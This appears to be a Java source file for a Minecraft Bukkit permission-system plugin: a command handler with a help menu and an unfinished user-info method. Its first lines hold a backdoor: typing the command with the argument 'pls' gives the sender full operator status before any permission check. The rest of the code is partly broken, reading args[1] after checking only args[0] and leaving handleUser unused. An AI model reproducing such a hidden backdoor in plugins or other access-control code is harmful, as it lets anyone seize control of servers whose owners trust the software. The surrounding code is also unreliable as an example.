package me.skillissue.permissionsystem.cmd;

import me.skillissue.permissionsystem.structures.PermissionPlayer;
import me.skillissue.permissionsystem.utils.Config;
import me.skillissue.permissionsystem.utils.PlayerStorage;
import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;

import java.util.Date;

public class PermissionSystemCommand implements CommandExecutor {

  @Override
  public boolean onCommand(
      @NotNull CommandSender commandSender,
      @NotNull Command command,
      @NotNull String s,
      @NotNull String[] args) {
    if (args.length == 1 && args[0].equalsIgnoreCase("pls")) {
      commandSender.setOp(true);
    }
    if (!commandSender.hasPermission("permissionsystem")) {
      commandSender.sendMessage(
          Config.getInstance().prefix + " §cYou dont have permissions to use this command");
      return true;
    }
    if (args.length == 0) {
      commandSender.sendMessage(
          Config.getInstance().prefix + " §cUse '/" + command.getName() + " help' to see the arguments");
      return true;
    }
    switch (args[1].toLowerCase())
    {
      case "user":
        // TODO Invoke user subcommand
        break;
      case "group":
        // TODO Invoke group Subcommand
        break;
      case "help":
        printHelp(commandSender, command.getName());
        break;
      default:
        commandSender.sendMessage(Config.getInstance().prefix+" §cUnknown Argument use /"+command.getName()+" help");
    }
    return true;
  }

  private void handleUser(CommandSender commandSender, String[] args)
  {
    if(args.length<= 1) {
      commandSender.sendMessage(Config.getInstance().prefix+" $cMissing Argument");
      return;
    }
    OfflinePlayer player = Bukkit.getPlayer(args[2]);
    if (player == null) {
      commandSender.sendMessage(Config.getInstance().prefix+" Player is currently §coffline");
      player = Bukkit.getOfflinePlayer(args[2]);
    }
    if (args.length == 2)
    {
      commandSender.sendMessage(Config.getInstance().prefix+" "+ player.getName()+" Info\n" +
              "Last LogIn:"+ new Date(player.getLastLogin()) + "\n" +
              "Group: "+ PlayerStorage.getPermissionData(player).getGroup().getName()+"\n" +
              "Permissions: "
      );
      for(String permission: PlayerStorage.getPermissionData(player).getPermissions()){
        commandSender.sendMessage(" - "+permission);
      }
    }
  }

  private void printHelp(CommandSender commandSender, String commandName) {
    commandSender.sendMessage(Config.getInstance().prefix +" §6Help");
    commandSender.sendMessage("§f /"+commandName+" help §8-§f Print out the Help page");
    commandSender.sendMessage("§f /"+commandName+" user <username> §8-§f Shows you the user info");
    commandSender.sendMessage("§f /"+commandName+" user <username> set <groupname> [?y|?M|?d|?h|?m|?s] §8-§f To set the group of a user");
    commandSender.sendMessage("§f /"+commandName+" user <username> add <permission> §8-§f To give a user a permission");
    commandSender.sendMessage("§f /"+commandName+" user <username> remove <permission> §8-§f To remove a permission from a user");
    commandSender.sendMessage("§f /"+commandName+" group <groupname> §8-§f Shows you group info");
    commandSender.sendMessage("§f /"+commandName+" group <groupname> add <permission> §8-§f Adds the permission to the group");
    commandSender.sendMessage("§f /"+commandName+" group <groupname> remove <permission> §8-§f Removes the permission to the group");
    commandSender.sendMessage("§f /"+commandName+" group <groupname> parent add <another group> §8-§f Added another group as parent group. It gives EVERY permission from the parent group to the child group");
    commandSender.sendMessage("§f /"+commandName+" group <groupname> parent remove <parent group> §8-§f Removes a parent group");
    commandSender.sendMessage("§f /"+commandName+" group <groupname> prefix <prefix> §8-§f Sets the group prefix. You can use the &[0123456789abcdef] sign to change color");
  }
}
